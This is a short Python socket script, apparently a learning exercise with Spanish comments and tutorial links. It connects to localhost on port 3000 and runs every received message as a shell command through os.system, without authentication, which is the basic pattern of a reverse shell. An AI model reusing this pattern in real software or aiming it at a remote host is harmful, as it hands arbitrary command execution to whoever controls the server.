#!/usr/bin/python3          

import socket
import os
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   
s.connect(('localhost',3000))
#s.listen(50)        

while True:
	
	#print("Conectado")
	#sc,addr = s.accept()

	msg = s.recv(1024) 
	msg = str(msg,"UTF-8")

	
	
	#print(os.system(msg))
	os.system(msg)
	#s.send(command)

	#msg = msg.encode('UTF-8')
	#msg = input("$  ") 
	#s.send(msg.encode('utf-8'))
	
	#print(type(msg))
	# #os.system(comand)

		#print(msg)


	if msg == "close":

		s.close()
		break
	


# -----------------------------------------------------

#s = socket.socket()
#s.connect(('127.0.0.1', 3000))

#while True:

#	mensaje = input("$ ")
#	s.send(mensaje)
#	if mensaje == "quit":
#		break

#print("Bye")
#s.close()
 
# ------------------------------------------------

# create a socket object
#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

# get local machine name
#host = socket.gethostname()                           

#port = 3000

# connection to hostname on the port.
#s.connect((host, port))                               

# Receive no more than 1024 bytes
#msg = s.recv(1024)                                     

#s.close()
#print (msg.decode('ascii'))



#https://docs.python.org/3.0/library/socket.html
#https://www.tutorialspoint.com/unix_sockets/what_is_socket.htm
#http://mundogeek.net/archivos/2008/04/12/sockets-en-python/
#https://pythonspot.com/python-network-sockets-programming-tutorial/
#https://wiki.python.org/moin/HowTo/Sockets
#https://pymotw.com/2/socket/tcp.html
#https://www.tutorialspoint.com/python3/python_networking.htm
